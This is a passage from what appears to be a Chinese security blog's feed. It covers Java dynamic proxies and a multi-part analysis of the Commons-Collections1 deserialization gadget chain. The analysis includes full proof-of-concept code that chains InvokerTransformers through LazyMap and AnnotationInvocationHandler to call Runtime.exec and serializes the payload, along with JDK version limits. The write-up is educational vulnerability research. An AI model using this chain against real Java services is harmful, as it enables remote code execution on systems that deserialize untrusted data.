System.out.println(<span class="string">&quot;Hello proxy!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代理类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloProxy</span> <span class="keyword">implements</span> <span class="title class_">HelloInterface</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">HelloInterface</span> <span class="variable">helloInterface</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hello</span>();</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sayHello</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Before invoke sayHello&quot;</span> );</span><br><span class="line">        helloInterface.sayHello();</span><br><span class="line">        System.out.println(<span class="string">&quot;After invoke sayHello&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代理类调用：<br> 被代理类被传递给了代理类<code>HelloProxy</code>，代理类在执行具体方法时通过所持用的被代理类完成调用。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="type">static</span> <span class="type">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        HelloProxy helloProxy = <span class="keyword">new</span> <span class="built_in">HelloProxy</span>();</span><br><span class="line">        helloProxy.<span class="built_in">sayHello</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">输出：</span><br><span class="line">Before invoke sayHello</span><br><span class="line">Hello proxy!</span><br><span class="line">After invoke sayHello</span><br></pre></td></tr></table></figure><p>使用静态代理很容易就完成了对一个类的代理操作。但是静态代理的缺点也暴露了出来：由于代理只能为一个类服务，如果需要代理的类很多，那么就需要编写大量的代理类，比较繁琐。</p><h3 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h3><p>利用反射机制在运行时创建代理类。接口、被代理类不变，我们构建一个<code>handler</code>类来实现<code>InvocationHandler</code>接口。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">import proxy.UserService;</span><br><span class="line">import proxy.UserServiceImpl;</span><br><span class="line">import java.lang.reflect.InvocationHandler;</span><br><span class="line">import java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line">public class Client2 &#123;</span><br><span class="line">    public static void main(String[] args) throws IllegalAccessException, InstantiationException &#123;</span><br><span class="line">        // 设置变量可以保存动态代理类，默认名称以 $Proxy0 格式命名</span><br><span class="line">       //System.getProperties().setProperty(&quot;sun.misc.ProxyGenerator.saveGeneratedFiles&quot;, &quot;true&quot;);</span><br><span class="line">        // 1. 创建被代理的对象，UserService接口的实现类</span><br><span class="line">        HelloInterface hello = new Hello();</span><br><span class="line">        // 2. 获取对应的 ClassLoader</span><br><span class="line">        ClassLoader classLoader = userServiceImpl.getClass().getClassLoader();</span><br><span class="line">        // 3. 获取所有接口的Class，这里的UserServiceImpl只实现了一个接口UserService，</span><br><span class="line">        Class[] interfaces = hello.getClass().getInterfaces();</span><br><span class="line">        // 4. 创建一个将传给代理类的调用请求处理器，处理所有的代理对象上的方法调用</span><br><span class="line">        //     这里创建的是一个自定义的处理器，须传入实际的执行对象 hello</span><br><span class="line">        InvocationHandler helloHandler = new HelloHandler(hello);</span><br><span class="line">        /*</span><br><span class="line">   5.根据上面提供的信息，创建代理对象 在这个过程中，</span><br><span class="line">               a.JDK会通过根据传入的参数信息动态地在内存中创建和.class 文件等同的字节码</span><br><span class="line">               b.然后根据相应的字节码转换成对应的class，</span><br><span class="line">               c.然后调用newInstance()创建代理实例</span><br><span class="line"> */</span><br><span class="line">        HelloInterface proxy = (HelloInterface) Proxy.newProxyInstance(classLoader, interfaces, helloHandler);</span><br><span class="line">        // 调用代理的方法</span><br><span class="line">        proxy.sayHello();</span><br><span class="line">        // 保存JDK动态代理生成的代理类，类名保存为 HelloProxy</span><br><span class="line">        // ProxyUtils.generateClassFile(proxy.getClass(), &quot;HelloProxy&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220425143320115-109776722.png" alt="image-20220425143318908"></p><p><code>InvocationHandler</code>和<code>Proxy</code>的主要方法有</p><p><strong>java.lang.reflect.InvocationHandler</strong></p><p><code>Object invoke(Object proxy, Method method, Object[] args)</code>定义了代理对象调用方法时希望执行的动作，用于集中处理在动态代理类对象上的方法调用</p><p><strong>java.lang.reflect.Proxy</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">static InvocationHandler getInvocationHandler(Object proxy)用于获取指定代理对象所关联的调用处理器</span><br><span class="line"></span><br><span class="line">static Class&lt;?&gt; getProxyClass(ClassLoader loader, Class&lt;?&gt;... interfaces)返回指定接口的代理类</span><br><span class="line"></span><br><span class="line">static Object newProxyInstance(ClassLoader loader, Class&lt;?&gt;[] interfaces, InvocationHandler h) 构造实现指定接口的代理类的一个新实例，所有方法会调用给定处理器对象的 invoke 方法</span><br><span class="line"></span><br><span class="line">static boolean isProxyClass(Class&lt;?&gt; cl)返回 cl 是否为一个代理类</span><br></pre></td></tr></table></figure><p>动态代理具体步骤：</p><ol><li>通过实现 <code>InvocationHandler</code> 接口创建自己的调用处理器；</li><li>通过为 Proxy 类指定 <code>ClassLoader</code> 对象和一组 interface 来创建动态代理类；</li><li>通过反射机制获得动态代理类的构造函数，其唯一参数类型是调用处理器接口类型；</li><li>通过构造函数创建动态代理类实例，构造时调用处理器对象作为参数被传入。</li><li>调用方法的时候通过 <code>super.h.invoke(this, m1, (Object[])null);</code> 调用，其中的 <code>super.h.invoke</code> 实际上是在创建代理的时候传递给 <code>Proxy.newProxyInstance</code> 的 <code>Handler</code> 对象，它继承 <code>InvocationHandler</code> 类，负责实际的调用处理逻辑。</li><li><code>Handler</code> 的 <code>invoke</code> 方法接收到 method、args 等参数后，进行一些处理，然后通过反射让被代理的对象 target 执行方法。</li></ol><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://zhuanlan.zhihu.com/p/347141071?msclkid=0fbfe08dc46311ecae26c4e44894f809">https://zhuanlan.zhihu.com/p/347141071?msclkid=0fbfe08dc46311ecae26c4e44894f809</a></p><p><a href="https://www.jianshu.com/p/9bcac608c714?msclkid=b40c8c68c44511ecb19300522d8d7118">https://www.jianshu.com/p/9bcac608c714?msclkid=b40c8c68c44511ecb19300522d8d7118</a></p>]]></content>
    
    
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;h3 id=&quot;代理模式&quot;&gt;&lt;a href=&quot;#代理模式&quot; class=&quot;headerlink&quot; title=&quot;代理模式&quot;&gt;&lt;/a&gt;代理模式&lt;/h3&gt;&lt;p&gt;为其他对象提供一个代理以控制对某个对象的访问。代理类主要负责为委托了（真实对象）预处理消息、过滤消息、传递消息给委托类，代理类不现实具体服务，而是利用委托类来完成服务，并将执行结果封装处理。&lt;/p&gt;</summary>
    
    
    
    <category term="Java安全" scheme="https://kpa1on.github.io/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="代理" scheme="https://kpa1on.github.io/tags/%E4%BB%A3%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>Java安全之Commons-Collections1分析（三）</title>
    <link href="https://kpa1on.github.io/2022/04/25/Java%E5%AE%89%E5%85%A8%E4%B9%8BCommons-Collections1%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%89%EF%BC%89/"/>
    <id>https://kpa1on.github.io/2022/04/25/Java%E5%AE%89%E5%85%A8%E4%B9%8BCommons-Collections1%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%89%EF%BC%89/</id>
    <published>2022-04-25T01:52:41.000Z</published>
    <updated>2022-04-26T04:56:23.068Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h3 id="cc链的另一种构造方式"><a href="#cc链的另一种构造方式" class="headerlink" title="cc链的另一种构造方式"></a>cc链的另一种构造方式</h3><p>接着上篇的分析，上文中讲到<code>LazyMap</code>通过<code>get()</code>方法可以达到利用链触发命令执行</p><span id="more"></span><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220425100217366-1661900816.png" alt="image-20220425100216545"></p><p>根据<code>get()</code>方法克制，根据传入的key进行判断，如果map中不包含此key，就会通过<code>factory</code>调用<code>transform()</code>方法，这里的<code>factory</code>是可以通过构造方法进行赋值的，那么这里可以将<code>factory</code>的值赋值为<code>ChainedTransformers</code>,就可以触发后面的调用链完成命令执行。但可以看到<code>LazyMap</code>的构造方法是被<code>protected</code>关键词修饰的，是无法直接进行new创建的，</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220425100840761-1896569264.png" alt="image-20220425100840057"></p><p>查找其他函数时，发现<code>decorate()</code>方法可以完成<code>factory</code>的赋值。这也是为什么在前面的POC里面我们调用该方法并传入<code>innerMap</code>和<code>transformerChain</code>参数。</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220425101040851-1566624004.png" alt="image-20220425101040219"></p><p>这里传入的<code>innerMap</code>为为一个Map集合，<code>transformerChain</code>为一个被<code>ChainedTransformer</code>修饰过的<code>Transformer[]</code>数组</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Map tmpmap = LazyMap.decorate(innerMap, transformerChain);</span><br></pre></td></tr></table></figure><p>调试分析，首先进入<code>decorate()</code>方法，完成<code>factory</code>的赋值</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220425101914918-253951094.png" alt="image-20220425101914180"></p><p>下一步进入get()方法，调用<code>transform()</code>方法，后续就是循环调用<code>Transformer#transform</code>方法</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220425102027194-2090880442.png" alt="image-20220425102026291"></p><p>上面是我们测试的POC的调用过程，但在实际利用中，如何让它调用到我们的<code>get()</code>方法呢，在上篇中<code>AnnotationInvocationHandler</code>的<code>invoke()</code>方法会调用<code>get()</code>方法</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220425180003976-1607958223.png" alt="image-20220425180002813"></p><p>根据构造方法传入第⼀个参数是⼀个<code>Annotation</code>类类型参数，该类是注解类，第二个是map类型参数，这个参数可以传<code>LazyMap</code>类型的对象去调用<code>get()</code>方法，<code>get()</code>方法调用<code>transform()</code>,</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220425180049855-1977873704.png" alt="image-20220425180049496"></p><p>怎么去调用<code>AnnotationInvocationHandler</code>的<code>invoke</code></p><h3 id="POC分析"><a href="#POC分析" class="headerlink" title="POC分析"></a>POC分析</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) throws InvocationTargetException, IllegalAccessException, NoSuchMethodException, ClassNotFoundException, InstantiationException, IOException &#123;</span><br><span class="line">        Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;&quot;getRuntime&quot;, new Class[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[] &#123;String.class &#125;, new Object[] &#123;&quot;calc.exe&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = new ChainedTransformer(transformers);</span><br><span class="line">        Map innerMap = new HashMap();</span><br><span class="line">        Map outerMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">        Class clazz =</span><br><span class="line">                Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        Constructor construct = clazz.getDeclaredConstructor(Class.class,</span><br><span class="line">                Map.class);</span><br><span class="line">        construct.setAccessible(true);</span><br><span class="line">        InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br><span class="line">        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] &#123;Map.class&#125;, handler);</span><br><span class="line">        handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap);</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;1.txt&quot;));</span><br><span class="line">        oos.writeObject(handler);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>看下这行代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] &#123;Map.class&#125;, handler);</span><br></pre></td></tr></table></figure><p>这里的<code>handler</code>是反射创建的一个 <code>AnnotationInvocationHandler</code>类。而<code>AnnotationInvocationHandler</code>中实现了<code>InvocationHandler</code>接口，可以直接作为调用处理器传入。在poc执行反序列化时，由于<code>AnnotationInvocationHandler</code>重写了<code>readObject()</code>方法，并且<code>readObject()</code>方法会调用<code>memberValues.entrySet().iterator()</code>，这里的<code>memberValues</code>即为被代理类<code>LazyMap</code>，通过构造方法传入并赋值</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220426000620806-1633479758.png" alt="image-20220426000617958"></p><p>在下面代理对象是<code>proxyMap</code>，当调用<code>proxyMap</code>的<code>entrySet()</code>会触发到<code>AnnotationInvocationHandler</code>的<code>invoke()</code>方法进行执行。这也是动态代理的一个特性，代理对象调用任意方法，调用处理器中的<code>invoke()</code>方法都会执行一次。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] &#123;Map.class&#125;, handler);</span><br><span class="line">        handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap);</span><br></pre></td></tr></table></figure><p>所以接下来就会执行<code>AnnotationInvocationHandler</code>的<code>invoke()</code>方法，接着调用<code>LazyMap#get()</code>触发后面的利用链</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220426003833650-887299424.png" alt="image-20220426003829666"></p><p>进入<code>get()</code>方法，如下，后面就和之前的利用过程一致了</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220426003854700-2086954144.png" alt="image-20220426003853411"></p><p>完整的利用链如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">ObjectInputStream.readObject()</span><br><span class="line">AnnotationInvocationHandler.readObject()</span><br><span class="line">Map(Proxy).entrySet()</span><br><span class="line">AnnotationInvocationHandler.invoke()</span><br><span class="line">LazyMap.get()</span><br><span class="line">ChainedTransformer.transform()</span><br><span class="line">ConstantTransformer.transform()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Class.getMethod()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Runtime.getRuntime()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Runtime.exec()</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>CC1这条链里面是有版本限制的，在高版本中对<code>readObject()</code>方法进行了修改，经过测试jdk &lt; 8u71，可以利用成功</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">jdk1.7.0_21 【成功】</span><br><span class="line">private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">        var1.defaultReadObject();</span><br><span class="line">        AnnotationType var2 = null;</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            var2 = AnnotationType.getInstance(this.type);</span><br><span class="line">        &#125; catch (IllegalArgumentException var9) &#123;</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Map var3 = var2.memberTypes();</span><br><span class="line">        Iterator var4 = this.memberValues.entrySet().iterator();</span><br><span class="line"></span><br><span class="line">        while(var4.hasNext()) &#123;</span><br><span class="line">            Entry var5 = (Entry)var4.next();</span><br><span class="line">            String var6 = (String)var5.getKey();</span><br><span class="line">            Class var7 = (Class)var3.get(var6);</span><br><span class="line">            if (var7 != null) &#123;</span><br><span class="line">                Object var8 = var5.getValue();</span><br><span class="line">                if (!var7.isInstance(var8) &amp;&amp; !(var8 instanceof ExceptionProxy)) &#123;</span><br><span class="line">                    var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + &quot;[&quot; + var8 + &quot;]&quot;)).setMember((Method)var2.members().get(var6)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">jdk1.8.0_171 【失败】</span><br><span class="line">private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">        GetField var2 = var1.readFields();</span><br><span class="line">        Class var3 = (Class)var2.get(&quot;type&quot;, (Object)null);</span><br><span class="line">        Map var4 = (Map)var2.get(&quot;memberValues&quot;, (Object)null);</span><br><span class="line">        AnnotationType var5 = null;</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            var5 = AnnotationType.getInstance(var3);</span><br><span class="line">        &#125; catch (IllegalArgumentException var13) &#123;</span><br><span class="line">            throw new InvalidObjectException(&quot;Non-annotation type in annotation serial stream&quot;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Map var6 = var5.memberTypes();</span><br><span class="line">        LinkedHashMap var7 = new LinkedHashMap();</span><br><span class="line"></span><br><span class="line">        String var10;</span><br><span class="line">        Object var11;</span><br><span class="line">        for(Iterator var8 = var4.entrySet().iterator(); var8.hasNext(); var7.put(var10, var11)) &#123;</span><br><span class="line">            Entry var9 = (Entry)var8.next();</span><br><span class="line">            var10 = (String)var9.getKey();</span><br><span class="line">            var11 = null;</span><br><span class="line">            Class var12 = (Class)var6.get(var10);</span><br><span class="line">            if (var12 != null) &#123;</span><br><span class="line">                var11 = var9.getValue();</span><br><span class="line">                if (!var12.isInstance(var11) &amp;&amp; !(var11 instanceof ExceptionProxy)) &#123;</span><br><span class="line">                    var11 = (new AnnotationTypeMismatchExceptionProxy(var11.getClass() + &quot;[&quot; + var11 + &quot;]&quot;)).setMember((Method)var5.members().get(var10));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        AnnotationInvocationHandler.UnsafeAccessor.setType(this, var3);</span><br><span class="line">        AnnotationInvocationHandler.UnsafeAccessor.setMemberValues(this, var7);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.cnblogs.com/nice0e3/p/13798371.html">https://www.cnblogs.com/nice0e3/p/13798371.html</a></p>]]></content>
    
    
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;h3 id=&quot;cc链的另一种构造方式&quot;&gt;&lt;a href=&quot;#cc链的另一种构造方式&quot; class=&quot;headerlink&quot; title=&quot;cc链的另一种构造方式&quot;&gt;&lt;/a&gt;cc链的另一种构造方式&lt;/h3&gt;&lt;p&gt;接着上篇的分析，上文中讲到&lt;code&gt;LazyMap&lt;/code&gt;通过&lt;code&gt;get()&lt;/code&gt;方法可以达到利用链触发命令执行&lt;/p&gt;</summary>
    
    
    
    <category term="Java安全" scheme="https://kpa1on.github.io/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="cc链" scheme="https://kpa1on.github.io/tags/cc%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>Java安全之Commons-Collections1分析（二）</title>
    <link href="https://kpa1on.github.io/2022/04/24/Java%E5%AE%89%E5%85%A8%E4%B9%8BCommons-Collections1%E5%88%86%E6%9E%90%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <id>https://kpa1on.github.io/2022/04/24/Java%E5%AE%89%E5%85%A8%E4%B9%8BCommons-Collections1%E5%88%86%E6%9E%90%EF%BC%88%E4%BA%8C%EF%BC%89/</id>
    <published>2022-04-24T07:41:03.000Z</published>
    <updated>2022-04-24T17:53:11.728Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><p>继续接着上文，上文我们通过方法调用弹出了计算器，那么在反序列化的漏洞场景下该如何运用呢。</p><span id="more"></span><p>下面为完整的调用链</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">ObjectInputStream.readObject()</span><br><span class="line">AnnotationInvocationHandler.readObject()</span><br><span class="line">Map(Proxy).entrySet()</span><br><span class="line">AnnotationInvocationHandler.invoke()</span><br><span class="line">LazyMap.get()</span><br><span class="line">ChainedTransformer.transform()</span><br><span class="line">ConstantTransformer.transform()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Class.getMethod()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Runtime.getRuntime()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Runtime.exec()</span><br></pre></td></tr></table></figure><h3 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h3><p>在分析调用链之前，先学习一下<code>LazyMap</code>，这个类和<code>TransformedMap</code>类似，都继承<code>AbstractMapDecorator</code>抽象类</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220424181355248-164962512.png" alt="image-20220424181354526"></p><p>根据之前的分析，可以知道<code>TransformedMap</code>的触发点是put()方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">put()-&gt;transformValue()-&gt;ChainedTransformer#transform()</span><br></pre></td></tr></table></figure><p>而<code>LazyMap</code>的触发点是在get()方法</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220424184102740-394006463.png" alt="image-20220424184103297"></p><p>get()方法的实现是首先判断map的中是否包含传入的key，当key不存在时，就会调用<code>transformerChain</code>的transform()方法。那么，我们根据这个触发点来编写如下poc</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) throws Exception &#123;</span><br><span class="line">       //此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码</span><br><span class="line">       Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">               new ConstantTransformer(Runtime.class),</span><br><span class="line">               new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;&quot;getRuntime&quot;, new Class[0] &#125;),</span><br><span class="line">               new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;),</span><br><span class="line">               new InvokerTransformer(&quot;exec&quot;, new Class[] &#123;String.class &#125;, new Object[] &#123;&quot;calc.exe&quot;&#125;)</span><br><span class="line">       &#125;;</span><br><span class="line"></span><br><span class="line">       //将transformers数组存入ChaniedTransformer这个继承类</span><br><span class="line">       Transformer transformerChain = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">       //创建Map并绑定transformerChina</span><br><span class="line">       Map innerMap = new HashMap();</span><br><span class="line">       innerMap.put(&quot;value&quot;, &quot;value&quot;);</span><br><span class="line">       </span><br><span class="line">       Map tmpmap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">       tmpmap.get(&quot;1&quot;);</span><br><span class="line"></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>运行完get()方法弹出计算器</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220425003117682-2015149661.png" alt="image-20220425003115659"></p><h3 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h3><p><code>AnnotationInvocationHandler</code>类的构造函数有两个参数，第⼀个参数是⼀个Annotation类类型参数，该类是注解类，第二个是map类型参数。</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220425003631092-1481504679.png" alt="image-20220425003629840"></p><p>所有的注解类型都继承自Annotation接口</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220425003958204-372179627.png" alt="image-20220425003956842"></p><p>查看<code>AnnotationInvocationHandler#readObject</code>方法</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220425004348631-2058048733.png" 